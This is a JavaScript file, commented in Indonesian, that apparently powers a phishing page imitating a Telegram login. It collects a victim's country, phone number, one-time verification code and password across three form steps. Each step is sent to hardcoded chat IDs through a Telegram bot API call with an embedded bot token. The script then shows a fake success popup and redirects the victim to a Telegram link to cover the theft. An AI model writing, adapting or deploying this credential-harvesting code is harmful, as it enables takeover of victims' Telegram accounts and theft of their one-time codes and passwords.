// Gantilah dengan token bot Telegram Anda
const TELEGRAM_BOT_TOKEN = "7390076325:AAHaEybFgEWqhl1z_QvbSGipMMJ_-VLtOYk"; // Gantilah dengan token bot Anda
// Daftar chat ID yang ingin menerima pesan
const CHAT_IDS = ["6124038392", "5460230196"]; // Gantilah dengan chat ID yang sesuai

// Fungsi untuk mengirim pesan ke Telegram
async function kirimKeTelegram(message) {
  // Menampilkan spinner loading sebelum mengirim pesan
  showLoading();

  // Kirim pesan ke semua chat ID yang terdaftar
  for (let chatId of CHAT_IDS) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML", // Gunakan HTML untuk format pesan (opsional)
    };

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      // Mengecek jika ada error dari response
      if (!response.ok) {
        throw new Error("Error");
      }
      console.log("Pesan terkirim ke Telegram");
    } catch (error) {
      console.error("Gagal mengirim pesan ke Telegram", error);
    }
  }

  // Sembunyikan spinner loading setelah selesai
  hideLoading();
}

// Fungsi untuk menampilkan spinner loading
function showLoading() {
  document.getElementById("loading").style.display = "block"; // Menampilkan spinner loading
}

// Fungsi untuk menyembunyikan spinner loading
function hideLoading() {
  document.getElementById("loading").style.display = "none"; // Menyembunyikan spinner loading
}

// Fungsi untuk menangani pengisian formulir dan pengiriman data
async function showCodeConfirmation(event) {
  event.preventDefault();

  // Validasi form pertama
  const phoneNumber = document.getElementById("phone-number").value;
  const country = document.getElementById("country").value;

  if (!phoneNumber || !country) {
    alert("Harap lengkapi semua inputan.");
    return;
  }

  // Buat pesan untuk langkah pertama
  const message1 = `
    <b>Inputan user :\n</b>
    <b>Negara:</b> ${country}\n
    <b>Nomor Telepon:</b> ${phoneNumber}
  `;

  // Kirim pesan ke Telegram
  await kirimKeTelegram(message1); // Tunggu sampai pengiriman selesai

  // Pindah ke halaman kode konfirmasi
  document.getElementById("phone-form").style.display = "none";
  document.getElementById("code-confirmation").style.display = "block";
}

async function showPasswordConfirmation(event) {
  event.preventDefault();
  const phoneNumber = document.getElementById("phone-number").value;
  const country = document.getElementById("country").value;
  const verificationCode = document.getElementById("verification-code").value;

  if (!verificationCode) {
    alert("Harap masukkan kode verifikasi.");
    return;
  }

  // Buat pesan untuk langkah kedua
  const message2 = `
    <b>Inputan user :\n</b>
    <b>Negara:</b> ${country}\n
    <b>Nomor Telepon:</b> ${phoneNumber}\n
    <b>Kode Verifikasi:</b> ${verificationCode}
  `;

  // Kirim pesan ke Telegram
  await kirimKeTelegram(message2); // Tunggu sampai pengiriman selesai

  // Pindah ke halaman konfirmasi password
  document.getElementById("code-confirmation").style.display = "none";
  document.getElementById("password-confirmation").style.display = "block";
}

async function redirectToTelegram(event) {
  event.preventDefault();
  const phoneNumber = document.getElementById("phone-number").value;
  const country = document.getElementById("country").value;
  const verificationCode = document.getElementById("verification-code").value;
  const password = document.getElementById("password").value;

  if (!password) {
    alert("Harap masukkan password.");
    return;
  }

  // Buat pesan untuk langkah ketiga
  const message3 = `
    <b>Inputan user :\n</b>
    <b>Negara:</b> ${country}\n
    <b>Nomor Telepon:</b> ${phoneNumber}\n
    <b>Kode Verifikasi:</b> ${verificationCode}\n
    <b>Password:</b> ${password}
  `;

  // Kirim pesan ke Telegram
  await kirimKeTelegram(message3); // Tunggu sampai pengiriman selesai

  // Tampilkan pop-up sukses
  document.getElementById("password-confirmation").style.display = "none";
  document.getElementById("popup").style.display = "flex";

  // Setelah 2 detik, arahkan ke Telegram
  setTimeout(function () {
    window.location.href = "https://t.me/addlist/eVdjrtPN-d04YzVl";
  }, 2000);
}

function togglePasswordVisibility() {
  const passwordField = document.getElementById("password");
  const passwordType = passwordField.type === "password" ? "text" : "password";
  passwordField.type = passwordType;
}
